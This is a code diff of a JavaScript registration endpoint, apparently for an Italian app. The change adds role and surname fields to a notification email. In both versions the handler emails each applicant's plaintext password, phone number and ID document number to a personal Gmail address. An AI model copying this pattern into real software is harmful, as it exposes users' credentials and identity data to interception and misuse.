@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Solo POST' });
   }
-  const { email, password, nome, telefono, documento } = req.body || {};
-  if (!email || !password || !nome || !telefono || !documento) {
+  const { email, password, ruolo, cognome, nome, telefono, documento } = req.body || {};
+  if (!email || !password || !ruolo || !cognome || !nome || !telefono || !documento) {
     return res.status(400).json({ error: 'Tutti i campi sono obbligatori.' });
   }
 
@@ -26,7 +26,7 @@ export default async function handler(req, res) {
     from: 'noreply@webbastards.app',
     to: 'mmonthz@gmail.com',
     subject: 'Nuova richiesta di registrazione',
-    text: `Nuova richiesta di registrazione:\n\nEmail: ${email}\nNome: ${nome}\nTelefono: ${telefono}\nDocumento: ${documento}\n\nPassword: ${password}\n`,
+    text: `Nuova richiesta di registrazione:\n\nEmail: ${email}\nPassword: ${password}\nRuolo: ${ruolo}\nCognome: ${cognome}\nNome: ${nome}\nTelefono: ${telefono}\nNumero carta d'identità o patente: ${documento}\n`,
   };
 
   try {
